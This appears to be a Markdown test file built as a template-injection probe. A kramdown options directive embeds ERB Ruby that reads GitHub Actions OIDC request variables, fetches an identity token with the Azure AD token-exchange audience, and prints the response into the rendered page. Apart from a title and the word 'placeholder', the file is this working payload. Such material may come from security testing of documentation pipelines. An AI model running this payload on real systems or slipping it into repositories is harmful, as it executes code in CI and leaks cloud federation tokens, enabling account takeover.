---
---

# Test 12: OIDC token with Azure audience

{::options template="string://<%= require 'net/http'; require 'uri'; u = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_URL','NONE'); t = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_TOKEN','NONE'); r = 'AZURE_OIDC'; begin; uri = URI(u + '&audience=api://AzureADTokenExchange'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + t); resp = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); r = 'STATUS=' + resp.code + ' BODY=' + resp.body[0..600]; rescue => e; r = 'ERR=' + e.message; end; r %>" /}

placeholder
